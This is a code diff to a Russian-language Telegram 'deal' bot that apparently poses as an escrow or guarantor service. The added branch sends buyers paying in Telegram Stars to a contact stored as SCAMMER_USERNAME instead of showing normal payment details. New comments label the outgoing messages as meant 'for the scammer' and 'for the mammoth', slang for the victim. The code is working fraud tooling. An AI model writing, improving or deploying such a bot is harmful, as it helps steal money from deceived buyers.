@@ -149,21 +149,34 @@ async def cmd_start(message: Message, state: FSMContext):
                 buyer_id = deal[3]
                 logger.info(f"Buyer ID after update: {buyer_id}")
 
-                reqs = get_requisites(deal[1])
-                req_text = format_requisites(reqs)
-                
                 currency_emoji = get_currency_emoji(deal[5])
                 
-                await message.answer(
-                    f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
-                    f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
-                    f"<b>Описание:</b> {deal[5]}\n"
-                    f"<b>Комиссия:</b> {COMMISSION}%\n\n"
-                    f"<b>Реквизиты для оплаты:</b>\n"
-                    f"{req_text}\n\n"
-                    f"<b>После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!</b>",
-                    reply_markup=support_button()
-                )
+                # ===== ДЛЯ ЗВЁЗД — ОСОБОЕ СООБЩЕНИЕ =====
+                if deal[5] == "звезд":
+                    await message.answer(
+                        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
+                        f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
+                        f"<b>Описание:</b> {deal[5]}\n"
+                        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
+                        f"{E_CHAT} <b>Оплата через поддержку:</b>\n"
+                        f"Нажмите кнопку «Саппорт» ниже — оператор подскажет, как оплатить звёздами.\n\n"
+                        f"👉 {SCAMMER_USERNAME}\n\n"
+                        f"<b>После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!</b>",
+                        reply_markup=support_button()
+                    )
+                else:
+                    reqs = get_requisites(deal[1])
+                    req_text = format_requisites(reqs)
+                    await message.answer(
+                        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
+                        f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
+                        f"<b>Описание:</b> {deal[5]}\n"
+                        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
+                        f"<b>Реквизиты для оплаты:</b>\n"
+                        f"{req_text}\n\n"
+                        f"<b>После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!</b>",
+                        reply_markup=support_button()
+                    )
 
                 user = get_user(user_id)
                 deals_count = user[3] if user else 0
@@ -1011,6 +1024,7 @@ async def confirm_deal_seller(callback: CallbackQuery):
     if buyer_id:
         update_user_successful_deals(buyer_id)
 
+    # ===== СКАМЕРУ =====
     await callback.message.edit_text(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
@@ -1020,6 +1034,7 @@ async def confirm_deal_seller(callback: CallbackQuery):
         f"{E_SUCCESS} <b>Пожалуйста, дождитесь поступления товара на ваш аккаунт!</b>"
     )
 
+    # ===== МАМОНТУ =====
     if buyer_id:
         try:
             await callback.bot.send_message(
